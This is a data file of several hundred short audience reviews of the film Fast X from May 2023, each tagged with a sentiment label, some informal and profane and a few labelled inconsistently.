"May 22, 2023",POSITIVE,Action after action. No time for any other thing. Typical Fast - what people want. Dont think just enjoy
"May 22, 2023",POSITIVE,These movies never disappoint. Not the usual tear jerker that comes with the fast and furious movies but it will definitely make you laugh.
"May 22, 2023",POSITIVE,The special effects the action pack attention keeper
"May 22, 2023",POSITIVE,Had a good story line
"May 22, 2023",POSITIVE,excellent movie! i was very entertained all the time during the movie can’t wait for part 2
"May 22, 2023",NEUTRAL,"Storyline wasn't logic, slot of things didn't add up. Jason was great and dark, he really enjoyed this (looking at his acting and face). Beginning with old movie scenes is very unnecessary. This way we can all make a movie. It doesn't need that for a sequel. Dom was to emotional and is from too soft back in the end to the rough guy again. Doesn't need these soft scenes. We didn't understand the story, and we watched all the movies. Missing the link over and over from the first movie."
"May 22, 2023",POSITIVE,Pure cinema. Jump the shark and point at it laughing. It’s what we need in 2023.
"May 22, 2023",NEGATIVE,The screenwriting was rushed and was forced to introduce characters to please the audience with nostalgia.
"May 22, 2023",POSITIVE,"Awesome movie, seen it twice already you will not be disappointed"
"May 22, 2023",NEGATIVE,"Too much of everything.  It wants to be a satire of action movies and itself for part of the time, then it keeps hammering the sincere values of 'family is everything' the rest of the time.  It's a live cartoon that's not cartoon enough.."
"May 22, 2023",POSITIVE,Wow I would give it a 10 if that was possible
"May 22, 2023",POSITIVE,Best one yet by far.
"May 22, 2023",POSITIVE,Felt like a ridiculous 90s action movie and I loved it! Just a fun movie!
"May 22, 2023",POSITIVE,This is easily the best out of the franchise
"May 22, 2023",POSITIVE,"Great action! This movie was more than I expected. Instead of ending the story, it took a slightly different turn. It was a great surprise!"
"May 22, 2023",POSITIVE,Great action packed movie from the beginning to the end.
"May 22, 2023",POSITIVE,Wow the best action and fights scenes Jason Mamoa stole the show!!!
"May 22, 2023",POSITIVE,Turn brain off and enjoy in 4dx
"May 22, 2023",NEGATIVE,"The story had to many nonsensical senes. And, the villain psyche was improperly developed. His back story didn't support his persona."
"May 22, 2023",NEGATIVE,Absolute sh*t like the other 9 movies.
"May 22, 2023",NEUTRAL,Overall was okay! Was a little disappointed at the end!
"May 22, 2023",NEGATIVE,Suuuuuucks!!!! The ability to make every movie worst than the last one is magic
"May 22, 2023",NEGATIVE,to much Unrealistic action.
"May 22, 2023",NEGATIVE,I didn’t like the ending of the movie. It was a waste of my time . It is awful that there won’t be another Fast XI made for the future . 
"May 22, 2023",NEUTRAL,"This movie didn't jump the shark. It strapped an f16 rocket to an '88 civic and drove it straight in to the Bermuda triangle, and that is a more logical situation than anything that happened in this movie. 

I must say before moving on, that I have been a ""Fast"" apologist since 2Fast2Furious.

The movie is comically ridiculous, and painful to watch at times. Where I have been trained to suspend my disbelief being a WWE fan my entire life. There were moments in the film that I couldn't curtail my laughter at the idea that no matter what, Torretto just may in fact be more powerful than Thanos himself.

Imagine Torretto was a character in GTA V, and you used the indestructible cheat code while in the middle of a 5 star police chase. 

Even that was more believable.

The real hero of this film was Aquaman himself, Jason Momoa. His acting is reminiscent of a hybrid, Heath Ledger's Joker, and Deadpool. Funny, intense, quarky, and psychotic. One of the funnest antagonists I have ever watched.

This movie is bad, there's no justifying it, but the badness is what made it funny for me. 

If you have an open mind, and a sense of humor, give it a watch. 

Fast X was entertaining for all of the wrong reasons."
"May 22, 2023",POSITIVE,action packed from start to finish
"May 22, 2023",POSITIVE,Jason Momoa steals the show!!! Non stop action and twists and turns. CLIFFHANGER
"May 22, 2023",POSITIVE,Really action packed. I felt like there should have been more to the story towards the end instead it left me hanging.
"May 22, 2023",NEUTRAL,"Man part 2, I’m ready!"
"May 22, 2023",POSITIVE,I came the whole time
"May 22, 2023",POSITIVE,"May I start by saying no one should go to a Fast & Furious movie thinking it will hint at Shakespeare. These are not movies with intricate plots and mystery. They are just for fun and excitement. With that in mind, Fast X satisfied!  Physics and gravity be damned!  Let's just have some fun thrill ride is what you get here. Sit back and enjoy!"
"May 22, 2023",POSITIVE,"excellent job, plenty of excitement and stunts"
"May 22, 2023",POSITIVE,The best move ever make
"May 22, 2023",POSITIVE,Awesome movie like all the rest
"May 22, 2023",POSITIVE,An excellent movie with great action scenes. I liked Brie Larson's performance. There were welcome surprises and drama. Words fail me in describing how much I loved the movie.
"May 22, 2023",POSITIVE,I love it cant wait for the next one!!!
"May 22, 2023",POSITIVE,I liked it.  But some stuff is to unrealistic as most know based off the previous movies. But excited to see the next part. Stay for the ending surprise actor comes back. Can't wait for the release date on the next movie.
"May 22, 2023",POSITIVE,"Horrible writing
Horrible acting
Horrible plot

I loved it"
"May 22, 2023",NEGATIVE,"Sorry, but original and Tokyo drift were the only good ones. The rest are reaching out there with their stunts etc. I love Jason Mamoa, but his character was way out there n ruined the movie"
"May 22, 2023",POSITIVE,I like the return of a character at the end don’t want to spoil it for anyone.
"May 22, 2023",POSITIVE,Soo good and even loved the cliff hangar
"May 22, 2023",POSITIVE,Highly Recommend Everyone To Go See This Movie!!!!!!!
"May 22, 2023",POSITIVE,"I loved the movie,can’t wait till they finish it."
"May 22, 2023",POSITIVE,The action is over the top but that's what you come for in a Fast movie anyway. The story is pretty good. Had a decent time.
"May 22, 2023",POSITIVE,A littel bad but good
"May 22, 2023",POSITIVE,Love the action from start to finish Jason Mamoa was zesty asf  must see movie make sure to stay for the end credits
"May 22, 2023",POSITIVE,Great cgi great plot
"May 22, 2023",POSITIVE,It was such great movie !!! Dont get up too soon at the end before the credits in black screen and white letters its not over til then
"May 22, 2023",POSITIVE,"Saw this film with my 2 brothers, sister, and niece. Best time Ever at the cinemas, with my family. a definitely must watch.!!!!!"
"May 22, 2023",POSITIVE,I love the movie but hate that we have to wait years to know what happened.
"May 22, 2023",POSITIVE,The ending left us confused!!!
"May 22, 2023",POSITIVE,I think this movie kept it fun and action pack bring in a few things from each movie Jason played his character very well better than his latest movies
"May 22, 2023",POSITIVE,Buncha good ol' pedal to da metal!!!!
"May 22, 2023",POSITIVE,Buncha good ol' pedal to the metal!!!!!
"May 22, 2023",NEGATIVE,Mucha ficción en la película 😕
"May 22, 2023",POSITIVE,Action packed! Can’t wait for the next one
"May 22, 2023",POSITIVE,Great Film! Loved it. Go See it. It’s filled with plenty of surprises.
"May 22, 2023",POSITIVE,"Loved it! My kids were so excited about going to see it! Didn't like the fact that the theater was filthy. Seats are torn, look so wasted and felt sticky."
"May 22, 2023",POSITIVE,keep our attention thought out but didnt really love the ending
"May 22, 2023",POSITIVE,Loved it! Can't wait for the next one!
"May 22, 2023",POSITIVE,We loved the whole movie.
"May 22, 2023",POSITIVE,"It is pure action that is enjoyed like crazy, knowing that it is an unreal movie"
"May 22, 2023",NEGATIVE,Everything in the movie was so fake that anyone who did it in real life would die immediately
"May 22, 2023",POSITIVE,"Did not disappoint, but they made it for 2 parts. Hopefully part 2 won’t disappoint."
"May 22, 2023",POSITIVE,everything was good 😊
"May 22, 2023",POSITIVE,Action upon action upon action
"May 22, 2023",POSITIVE,The best action scenes of any Fast and furious movies. The best one yet and more to come!! 🙌🙌. Loved it. Must watch on IMAX
"May 22, 2023",POSITIVE,bunch of action with little plot but it's good to see some old faces back. overall it's ok movie
"May 22, 2023",POSITIVE,Knowing that it is not the end of the F&F story!
"May 22, 2023",POSITIVE,Jason Momoa. 'Nuff said.
"May 22, 2023",POSITIVE,Fast X was absolutely great. Cliffhanger ending was great & a perfect end credit. This definitely redeemed the Fast Franchise after 9. Looking forward to Fast 11
"May 22, 2023",NEGATIVE,I'm disappointed with the way this movie was done. It's gone off the rails from the original Fast and Furious. I was at the movie theater and had prepaid or I would have walked out. This doesn't make sense on so many levels. Jason Momoa's role was uncalled for. I just don't understand the point.
"May 22, 2023",POSITIVE,Loved the new characters and chase scenes .
"May 22, 2023",POSITIVE,"I loved the action packed scenes and how many of the previous cast were included. I didn’t like the character Mimosa played, he was over animated."
"May 22, 2023",POSITIVE,I liked that it had scenes talking about faith in God and family majority of the time.
"May 22, 2023",POSITIVE,"Action packed, high octane, over the top stunts! Its what you expect from the Fast and Furious series. Jason Mamoa makes a great villain and the character suits him well! The beginning of the end indeed! A must-see for fans of the franchise."
"May 22, 2023",POSITIVE,I didnt like how it ended ..
"May 22, 2023",NEGATIVE,The movie plot was good. Jason Momoa's character was terrible. I like Jason Momoa and I am a fan of his but not of his character. It would have been better if it had been dark an sinister and not like the Batman Joker.
"May 22, 2023",POSITIVE,Loved everything about it!!!
"May 22, 2023",POSITIVE,Amazing so many good little new stories and plots and twist.
"May 22, 2023",NEGATIVE,"Jason Momoa, é o grande destaque do filme, um filme cheio de grandes astros que não conseguem salvar o roteiro cansativo."
"May 22, 2023",POSITIVE,loved every scene from it :))
"May 22, 2023",NEGATIVE,"Worst one out of all of them. Ive been a loyal fan since day one!  I was turned off within the first 20 minutes of watching. The movie had no point to it. The movie would have been better without that fruit cake Dante. You can count me out on watching, if another movie comes out!"
"May 22, 2023",POSITIVE,"Wassup, y’all! The year was 2001. My homie Mike and I were roommates living in College Park, GA. Four years removed from our hometown yet four years deep in ATL shenanigans. I had a Honda Del-Sol and wasn’t afraid to race anything on the highway. There was this new movie out called “The Fast and the Furious” playing at the Magic Johnson Theater so I went to check it out. Once the movie let out, I got in my mighty Del Sol – full of adrenaline – and drove around 100 mph weaving in and out of traffic all the way back home! That film had me hooked. Apparently, I wasn’t the only one because twenty-two years and 6.6 billion accumulated dollars later, the franchise still has folks flying through traffic to watch it. In the latest installment, a new villain, perhaps the most sinister of them all, has Dominic Toretto and the Furious gang on his hitlist, and he ain’t giving two shyts about traffic laws. Let’s go!

     Go Speed Racer, go Speed Racer, go Speed Racer gooooooo! “Fast X” stars pretty much the entire Fast and Furious crew from the last film, with a few new additions. The frenetic family is at home chillin’ without a care but unbeknownst to them, a psychopath has been plotting the ultimate revenge scheme that will leave Toretto’s soul in shambles. If you’ve been rocking with this franchise, you know it has changed – and that’s an understatement. Going from plausible plots to straight-up outrageous storylines transformed this series dramatically, but its metamorphosis has been a gradual process so we should be accustomed to the over-the-top antics by now. The newest offering is nothing short of unbelievable, but I’m here to tell ya – it’s an action-packed smash up derby! I’ll start with the antagonist. Jason Momoa is the apex of bad guys! Dante Reyes, Momoa’s character, loves only one thing: infliction of suffering. He’s an eccentric, flamboyant Castor Troy from the movie “Face Off” mixed with a little sadism of The Joker from the Batman comics. Momoa gives a fantastic performance and definitely injects new life into the movie. The rest of the cast does a good job as well. No one is really given any riveting character arcs or anything groundbreaking, although Tyrese’s character Roman has a meatier purpose this time around. I mean, it’s still Roman, so don’t expect any dramatic dialogue. 

     Action is the hallmark of the “Fast” franchise, right? Well, action’s foot is never taken off the accelerator! Just when you thought there were no more outlandish action scenes to be conceived, director Louis Leterrier says, shiiiiiiiid! Explosion!!! Overpowering, over the competition they’re towering! Bomb balls rolling down the streets of The Vatican, people jumping out of cars at Mach 5 speeds, bullets flying but no one dying, it’s illogical but amazing. The feats we see onscreen are impossible to mere mortals, but this is the family of Dom Toretto, dammit, they CAN’T die! Deep down, we don’t want them to, either. All jokes aside, the action is must-see movie magic. In all the mayhem, there is a pretty good plot, too. Even in all its glory, the flaws stand out like a Lamborghini in the hood. Bad tone shifts are louder than a muffler, some “in-house” fight scenes are forced and unnecessary, and near the end of the 2nd act, it begins to veer off track. Having said that, “Fast X” is still one heart-racing, 95 octane thrill ride. If you’re a fan of the franchise, you’ll love this! I’m gonna co-sign “Fast X” to the fullest. There are hella surprises in this film, and please stick around for the mid-credit scene. As I always say, if you can, check it out in IMAX! Yeah, eventually, this thing is gonna end, but while it’s redlining down theater highway, just enjoy the ride…"
"May 22, 2023",POSITIVE,"it was finominal, just excellent 👌."
"May 22, 2023",NEGATIVE,Momoa isn't a credible villain which makes this one lame.
"May 22, 2023",POSITIVE,Great dialogue. Very entertaining. Too over the top with the car scenes.
"May 22, 2023",POSITIVE,so good hated the cliffhanger
"May 22, 2023",POSITIVE,Great movie - action packed with unbelievable special effects.  Fast and Furious is one of the best franchises in the movies for a reason and this chapter did not disappoint!
"May 22, 2023",POSITIVE,The entire movie was great
"May 22, 2023",NEUTRAL,"Ridiculous rubbish....and I loved every second of it 😅. Knows exactly what it is and revels in it, much better than 8&9 too."
"May 22, 2023",NEUTRAL,The family lines are cringe and when Brian floated car to car
"May 22, 2023",POSITIVE,great movie! Jason Momoa was so extra lol I love it!
"May 22, 2023",POSITIVE,The movie is exciting from the beginning and leaves you in suspense at the end
"May 22, 2023",POSITIVE,Very action packed and had good comical moments
"May 22, 2023",NEGATIVE,The movie was awful. It was a dumb car chase that lasted for 2 hrs
"May 22, 2023",NEUTRAL,Lots of non stop action and surprises. Didnt like how it how it ended though..cliffhanger
"May 22, 2023",POSITIVE,It was good. It has a lot of good aspects to it. Can't wait to see what happens in the next. I like how it leaves you on a cliffhanger.
"May 22, 2023",NEGATIVE,"Good actors ending sucked, left audiences want more which I get to a sequel but  a little on edge  side. Couldve been better. Will never beat the first few when it first started, overall ok for pass time."
"May 22, 2023",POSITIVE,Story and action packed from beginning to ending of the movie!!!
"May 22, 2023",POSITIVE,"Great movie!! definitely worth it, can't wait to see where it goes next"
"May 22, 2023",POSITIVE,"Amazing, Amazing, AMAZING!!!!"
"May 22, 2023",NEGATIVE,"The preposterous stunts and improbably twists were entertaining, although past the point of believability. What turned me off was the intentional linking of the villain to being gay and mentally ill. They didn't need to be homophobic, but decided to go for it with the villain painting toenails (albeit on corpses) and prancing about. In a story dripping with crosses and the emphasis on family, it's sad that they felt the need to turn to hate."
"May 22, 2023",NEGATIVE,literally the worst movie i have ever seen
"May 22, 2023",POSITIVE,It is an absolutely mist see.  I always enjoyed Fast n Furious movies.  Some of the best action movies
"May 22, 2023",NEGATIVE,First movie of the year that made me fall asleep
"May 22, 2023",POSITIVE,"As long as you understand that this is a movie for entertainment, you will enjoy the action."
"May 22, 2023",NEGATIVE,"Listen, YOU know these movies suck. I know these movies suck. No one is going in expecting cinematic brilliance. I, personally, ""hate watch"" them knowing I'm going to be angry about how bad they are. That said, Jason Mamoa, as Dante, is hilariously unhinged over the top. He makes the most of the ridiculous script, delivering some of the funniest lines in the movie."
"May 22, 2023",POSITIVE,Movie is a must to see
"May 22, 2023",POSITIVE,Loved it! Jason momoa is by far the best villian!
"May 22, 2023",POSITIVE,Great addition to franchise and leaves you hanging at the end for the next one!
"May 22, 2023",NEUTRAL,Good storyline and plot. Lots of action but some unbelievable. The ending left a lot of unanswered questions. Definitely stay until full movie credits complete.
"May 22, 2023",NEGATIVE,"Honestly, idk wtf they're doing. 
Jason Momoa looks like the Joker (from Batman). 
Great actors, but the movie is non sense from the very first moment. 
I was hoping that they could bring back the essence from the the beginning of the franchise, but the f***** everything again."
"May 22, 2023",POSITIVE,I fucking love this franchise. i’m soo excited for part 2 and 3 !! I hope that i get to be apart of this franchise before it ends or get to go to the actual premiere
"May 22, 2023",POSITIVE,"Fast X is action packed and fun with great performances, especially from Jason Momoa. it also toned down some of the ridiculousness, so fans who thought cars in space were too much will probably like this movie more.   The ending may divide fans.  Stay for the mid-credit scene, though!"
"May 22, 2023",POSITIVE,"It was exactly what I wanted from a Fast Movie. Loved the Rome sequence , Jason Momoa was a crazy awesome villain and the set up for the next movie was great . Can't wait for the next part ."
"May 22, 2023",NEGATIVE,"I have enjoyed the past films a dumb fun. They aren't meant to be intellectual, just entertaining.  This movie is the first of the series that I actually think was hot garbage. Jason Mamoa's performance was gross. It is truly sad that Brie Larsen was the only performance that was worth a dime. Sad thing is.. this was just part 1..."
"May 22, 2023",NEUTRAL,"It was a fun watch, a little weird in the beginning. I liked it but the end was weird and out of place, seemed like a cash grab at the end but besides that it was a good movie"
"May 22, 2023",POSITIVE,All the twists and turns kept us guessing throughout the movie! It was fantastic!
"May 22, 2023",NEGATIVE,It was the longest movie with no climactic ending. Of course it left a opening for there to be a FAST 11. Worst movie from the fast and furious series. VERY DISAPPOINTED
"May 22, 2023",POSITIVE,Who needs Rotten Tomatoes when you have FAMILY? 11/10 would cars and family again
"May 22, 2023",NEGATIVE,Man. Cheesiest dialogue ever—though maybe it was on purpose. Only redeeming elements were Momoa’s bad guy and Paul Walker’s daughter’s cameo.
"May 22, 2023",POSITIVE,Jason Momoa adds a lot of fun to this franchise with a goofy yet frightening villain. The gang is all here (minus Hobbs) and as lovable as ever. The movie is a blast to watch from start to finish line.
"May 22, 2023",POSITIVE,loved every dam minute of it.
"May 22, 2023",POSITIVE,It's been a long time since I felt thrilled by a movie like this. Love it! Can't wait for the next one!
"May 22, 2023",NEUTRAL,Too many directions was hard to follow
"May 22, 2023",POSITIVE,Always amazing 😮‍💨❤️
"May 22, 2023",POSITIVE,Tons of action!! it doesn't disappoint as the next chapter on the Fast and Furious chapter.
"May 22, 2023",POSITIVE,"Loved it, loved the action and the humor can’t wait for the next parts"
"May 22, 2023",NEUTRAL,Jason Momoa was excellent. Plot felt rushed but still good.
"May 22, 2023",NEGATIVE,As far as I was concerned after watching this movie it was pretty cheesy as far as Jason moma character was portrayed. The franchise has gotten really far away from the racing aspect of the movie.. Now it's all about missions and working for the government. What in the beginning they fought against?. There are some really cool scenes in the movie. But that is about it it was not a complete movie. They left you hanging for the next one at the number 11 to come outhere was a surprise in the and that was kind of cool and I'm. Looking forward to seeing the next one hopefully they just have a better overall movie. In my opinion this movie just was not that good.
"May 22, 2023",POSITIVE,Loved it!  Can’t wait to see the final one!
"May 22, 2023",POSITIVE,"Action-packed movie with a lot of star power. The momentum kept going from start to finish. The action, along with Momoa's villain character, made this feel like a live-action comic book, but I enjoyed it nonetheless."
"May 22, 2023",POSITIVE,"Great action, didn't expect the ending, hopefully there will be another one to make The ending more positive"
"May 22, 2023",POSITIVE,Movie was good but I though was the end of the saga but I guess I was wrong.
"May 22, 2023",POSITIVE,It kept me on the edge of my seat!
"May 22, 2023",NEGATIVE,"Fast X is a cinematic experience that will surely leave you questioning the limits of logic and embracing the absurdity of the fast and furious franchise. If you're looking for a movie that takes itself seriously and offers a thought-provoking narrative, then this is definitely not the film for you.

The plot of Fast X revolves around a group of street racers turned superheroes who find themselves battling evil masterminds, all while driving at ridiculously high speeds and performing mind-boggling stunts. It's a predictable story that doesn't offer much in terms of depth or originality.

The characters in the movie are one-dimensional at best, with most of their dialogue consisting of cheesy one-liners and poorly executed attempts at humor. The film seems to prioritize juvenile antics and immature humor over character development or compelling storytelling.

Visually, Fast X is a spectacle, with high-octane action sequences and elaborate car chases that defy the laws of physics. However, the constant bombardment of over-the-top explosions and mindless destruction becomes repetitive and loses its impact as the movie progresses.

One of the most frustrating aspects of Fast X is its blatant disregard for any semblance of realism. The laws of physics are repeatedly bent, if not outright broken, to accommodate the filmmakers' desire for increasingly outrageous stunts. While it may be entertaining for some, it undermines any sense of believability and leaves you questioning the filmmakers' dedication to coherence.

In the end, Fast X is a mindless and ridiculous movie that aims to entertain through sheer spectacle and outrageousness. It's a film that thrives on juvenile humor and embraces its own immaturity. If you're in the mood for mindless action and don't mind sacrificing logic and coherence, then this film might offer some temporary amusement. However, if you're seeking a movie with substance and depth, it's best to look elsewhere"
"May 22, 2023",POSITIVE,"The greatest movie you’ll wish you never watched!  Fast X has all the drama, action and all star cast…unfortunately, the movie ends in a cliffhanger as if moviegoers will be able to tune in next week to catch Part II."
"May 22, 2023",POSITIVE,Loved everything about it
"May 22, 2023",NEUTRAL,Fast moving. Loved all the different actors involved.
"May 22, 2023",POSITIVE,Everything you want in a Fast movie absolutely love it definitely worth the watch highly recommended it.
"May 22, 2023",POSITIVE,Liked everything. It was awesome
"May 22, 2023",POSITIVE,We were extremely entertained by this latest edition of Fast and Furious. Definitely one of the best ones that we have seen. Very exciting and also hilarious. Jason Momoa stole the movie and everything he was in.
"May 22, 2023",POSITIVE,"Lots of action, Jasn Momoa was awesome."
"May 22, 2023",NEGATIVE,Needed more action so disappointed.... I didn't like the movie!
"May 22, 2023",POSITIVE,"Non-stop action, and Mamoa doing a great Joker impression. What's not to like????!!!!"
"May 22, 2023",POSITIVE,I left my brain at the door and believed it was all possible!
"May 22, 2023",POSITIVE,Liked the action. Disliked the actor who portrayed Dom's son. Not even close to the boy who portrayed him before
"May 22, 2023",NEUTRAL,"not exactly sure what I was expecting, but there was nothing exceptional about this movie."
"May 22, 2023",POSITIVE,best one since tokyo drift!
"May 22, 2023",POSITIVE,"Big, loud, dumb fun. Fast X delivers the goods. Jason Momoa is diabolically delicious! This is completely HIS movie. Dominates every scene he's in. Even if you're losing steam for the franchise, see this for Momoa. And, of course, for the physics-defying stunt work, which is once again an absolute panic."
"May 22, 2023",NEGATIVE,"So bad its good. Hilarious in a ""Showgirls"" way."
"May 21, 2023",NEUTRAL,Not the normal Fast and Furious type movie. Very disappointed at the plot of this movie.
"May 21, 2023",NEUTRAL,It was a good movie. A little too long in the begining. They could have cut some unnecessary scenes there and maybe spent more time at the end and finished this movie. Didn't like how it ended.
"May 21, 2023",NEUTRAL,"The characters are still who we have grown to love. Jason Momoa was incredible. The story line, I enjoyed - but the unbelievable stunts, it’s way too over the top and honestly really detracted from the film. The ending felt very abrupt, but was happy with the end credit scene. This film needs to go back to its roots, a little less crazy would go a long way toward bringing it back full circle. Love these characters and hate to see them navigating these completely unrealistic scenarios. Writers…Let’s bring it back down to earth before you ruin it completely."
"May 21, 2023",NEUTRAL,The ending was confusing
"May 21, 2023",POSITIVE,"Awesome action packed movie.  A little long, but nevertheless, great. Wasn't crazy about Momoa's weird flakey character, would've preferred a less fruity villain."
"May 21, 2023",NEUTRAL,It had a lot of funny parts due to Jason Mamoas character but it had some flash backs from the originals. It was ok.
"May 21, 2023",NEGATIVE,"Didn't like the ending, no idea that is was going to be a two or three part movie."
"May 21, 2023",NEUTRAL,"NOT my genre of film, not expecting much, yet the special effects, stunts and high budget action was a WOW and enjoyable good vs bad plot without a cuss word every sentence.   Enjoyable and surprising looks like Vin has finally taken acting lessons, worth seeing."
"May 21, 2023",POSITIVE,Liked the action and scenery.
"May 21, 2023",POSITIVE,Jason mamoa is the best bad guy thus far.  Very creative.
"May 21, 2023",POSITIVE,I love the F& F franchise. My only issue is how really over the top each new movie gets and yet everyone survives without any injuries except a few scratches. Watching a child jump from one speeding car into another is just ridiculous without any harm. Why have it in the movie
"May 21, 2023",POSITIVE,Excellent Movie!!!  Packed with action!!  I can't wait to see the next movie in the series!!
"May 21, 2023",POSITIVE,The movie was great!! Action packed Go watch it
"May 21, 2023",POSITIVE,The action is really entertainment
"May 21, 2023",POSITIVE,"A bit too fantastical, which they've all been but this one is more than most. Mamoa did a good job. Made up for Vin Diesel cheesy quotes. Fun movie though that ended abruptly."
"May 21, 2023",NEGATIVE,Only watched it because I’ve seen all them at this moment I’m just waiting for it to end lol and yes it’s going to be another smh 🤦🏾‍♂️ lol
"May 21, 2023",POSITIVE,IMAX EXPERIENCE WAS AWESOME.   JASON MAMOA WAS FUNNY.
"May 21, 2023",POSITIVE,Awesome movie as usual.
"May 21, 2023",POSITIVE,"The best one they made in years, to be honest! It's definitely better than the last 3 made. Must watch"
"May 21, 2023",POSITIVE,I thought it was great movie I will see it again I'm excited for next one
"May 21, 2023",POSITIVE,Awesome. Loved it!!!
"May 21, 2023",POSITIVE,Action packed...stunts were awesome!
"May 21, 2023",POSITIVE,More Fast..Shut off your brain and enjoy
"May 21, 2023",POSITIVE,"It was non stop action. The acting, script and special effects were very well done. We would recommend it and likely will see it again and again."
"May 21, 2023",POSITIVE,"Insane , looking forward the next one"
"May 21, 2023",POSITIVE,Fun family audience with lot of laughter and humor. Action pack enough for entertainment
"May 21, 2023",POSITIVE,"My F&F fam. didn't disappoint me as always.........Woww, what another epic ride.......worth seein'.........Can't wait for the rest! 😀"
"May 21, 2023",POSITIVE,"Loved the action, disliked the ending."
"May 21, 2023",NEUTRAL,It was ok. Drawn-out a little too much for me.
"May 21, 2023",POSITIVE,I cant pin point it. It was good but it wasnt great.
"May 21, 2023",NEUTRAL,The Cheese is High with this one
"May 21, 2023",POSITIVE,"Exciting, action packed with lots of amazing characters and adventures."
"May 21, 2023",NEGATIVE,The movie is a completely disaster the participation of Jason Momoa was a crap it was more like a joker the history is terrible no street race at all they should stopped in fast 7 after Paul walker die seriously is a terrible movie and ending in nothing just with showing Giselle back to life friend of cyber is a completely crap
"May 21, 2023",POSITIVE,"Ive disliked the last two movies because I feel like theyd gotten away from what originally was FF, racing, but I actually enjoyed this one. No cars in outer space thankfully! Lol a twist for sure towards the end"
"May 21, 2023",POSITIVE,Action packed.  WOW!!
"May 21, 2023",NEGATIVE,"Way way way over the top and unrealistic. The movie is expected unrealistic situational outcomes, expected street racing but, the movie ends open-ended leaving room for a follow up movie.   Why won't this franchise die already?"
"May 21, 2023",POSITIVE,So umm where do I start with FastX it's such a great movie that is so much better than the past movies in the franchise. The acting is phenomenal especially Vin Diesel and Jason Mamoas characters. It is very entertaining and enjoyable. If you are thinking it's going to be bad just know you are wrong and you should definitely see it for yourself. I wasn't expecting much but damn I was wrong and I'm happy I was. The suspense is great especially at the last 10 minutes of the film. I really do feel it proved us wrong and that the franchise will have a great ending. It literally exceeded my expectations. While I can say there was too much special effects but it did end up working at the end.
"May 21, 2023",POSITIVE,"Absolutely LOVED it!! Jason Momoa was such a great villain, so many cameos, great action scenes and it really started to tie all the previous movies together. Stay after the credits. You won't be disappointed. Such a great movie!!"
"May 21, 2023",POSITIVE,"Brian didn’t make a new appearance in the movie, but overall it was great!"
"May 21, 2023",POSITIVE,"Awesome movie, didn't disappoint in any way. Ending was a surprise."
"May 21, 2023",NEUTRAL,"Ok, the lines were absolutely cringe-worthy, Aquaman bad guy was the epitome of the 1 dimensional cartoon villain. The action was so nonsensical that if Dom’s Dodge transformed into an Autobot, I wouldn’t be surprised in the slightest. Brie Larson might be thEEE worst working actress in Hollywood. Michelle Rodriguez looks like she’s been working in the adult film industry for 20 years and it finally caught up with her (great shape though, big kudos). That being said, it was hugely entertaining and fun, can’t wait to see the follow up. Go have some fun at the theater, it’s a good ole’ time."
"May 21, 2023",POSITIVE,Kept you on your feet the whole movie . Action packed from start to finish . Would recommend it to anyone that loves cars to watch it .
"May 21, 2023",POSITIVE,"This movie was action packed.  Loved how it all
Came together.  How all the characters were neatly connected.  So if you havent seen any of the other movies you can still understand this one.  My suggestion see them anyway.  
I thought that Mamoa wasnt going to be a good bad guy but he did an excellent job and the biggest surprise was the Rock at the end."
"May 21, 2023",POSITIVE,I love it Can’t wait for 11
"May 21, 2023",NEUTRAL,I feel like it was a little rushed
"May 21, 2023",POSITIVE,"A lot of action, very exciting!"
"May 21, 2023",POSITIVE,It was awesome  great  cliffhanger ending  which leads to maybe a 11.
"May 21, 2023",POSITIVE,Loved it! Which part? All of it
"May 21, 2023",POSITIVE,"I really liked the way the characters from the past movies were used for the storyline. And, of course, I enjoyed the action sequences."
"May 21, 2023",POSITIVE,Movie was amazing. It got really good towards the middle and ending. It has comedy and amazing actors.
"May 21, 2023",POSITIVE,I love everything about it and ready to see it again!!!
"May 21, 2023",NEUTRAL,"A lot an action with no end it sight, why because there's going to be a part maybe 3 before this franchise is over. If I'd known that my opinion on this movie would be different, I truly thought this was going to be a 3 hour 🎦"
"May 21, 2023",POSITIVE,"Amazing action movie, full of thrills, for people who love the fast series. Jason Mamoa was great!"
"May 21, 2023",NEUTRAL,"Fast X
The FAST Saga continues 

Decided to join the family at the Sunday cookout and things got really crazy 

On a scale of 1-10 of ridiculousness ,  this movie ranks as an 11 . Almost feels like people in these movies have inherited the toon force. With the things that happen in these movies everyone should be dead within 5 minutes. Action/Destruction are all on max settings. I now know where those low budget Bollywood/Tollywood movies get all their ridiculous vfx ideas from. It's directly from Vin Diesel. 

Acting wise the core characters were no different from previous movies including Dom. He still stands out as the leader and guy who can warp reality to suit his needs. I bet him and John Wick from the last movie would make one unstoppable force.
The support characters where decent, hatd have a good balance since there is just so many of them but they did enough to make you still want to know what happens to them.

The villain Jason was great and felt like a proper threat but there where a ton of moments where he was just annoying AF especially with the way he acted and what outfits he wore. Coming back to the toon force reference it also applies to him as some moments just make you scratch your head and say WTF. 

The movie does end on a cliffhanger and teases part 2 of 300 . Unlike the other movies there was no Sunday cookout here so leaves you wondering what's next, almost feels like how a TV series would end."
"May 21, 2023",POSITIVE,Wow! Lots of action!
"May 21, 2023",NEGATIVE,Almost slept during the show. At least they didnt drive in the space this time chose to drive on a dam instead lol. This franchise needs to die.
"May 21, 2023",NEGATIVE,"The action was mostly centered on Vin Diesel, and was not what I expected. The story has no end as it's part one of an obvious two part. I also thought the CGI was not up to speed for this brand of movie."
"May 21, 2023",POSITIVE,Loved the movie can wait for the next one.  Love the Fast family they never disappoint
"May 21, 2023",POSITIVE,"Look, it's not going to win any new fans…but for those who love the franchise, it's spot on and connects to the overall story pretty well.  I just hope the next one is truly the end and they don't drag it out further."
"May 21, 2023",NEGATIVE,"Thought this was the last one, ending was horrible. To much going on in the movie."
"May 21, 2023",POSITIVE,it did end on a cliffhanger though.
"May 21, 2023",POSITIVE,I loved it so much action Jason Momoa is the best villain ever!
"May 21, 2023",NEGATIVE,Aqua man saved the movie to be truthful. Yes we already this film pushes the limits but the corny lines and things that happened just mind blowing. And the way it “ended” for the love of everyone smh.
"May 21, 2023",POSITIVE,Great action.  Cool cars.
"May 21, 2023",POSITIVE,"Not a huge story line, but great!"
"May 21, 2023",POSITIVE,Great movie. Good surprises.
"May 21, 2023",POSITIVE,Awesome movie if you like any of the fast and the furious movies this one has many surprises
"May 21, 2023",POSITIVE,"As usual, action packed and kept you on the edge of your seat."
"May 21, 2023",POSITIVE,F&F never Disappoints
"May 21, 2023",POSITIVE,"Excellent cars, tons of action but impossible stunts!!! The humor was constant!!"
"May 21, 2023",NEGATIVE,A never ending hot mess.
"May 21, 2023",POSITIVE,me and my bf loved it  cant wait to watch fast 11 when it comes out in 2025
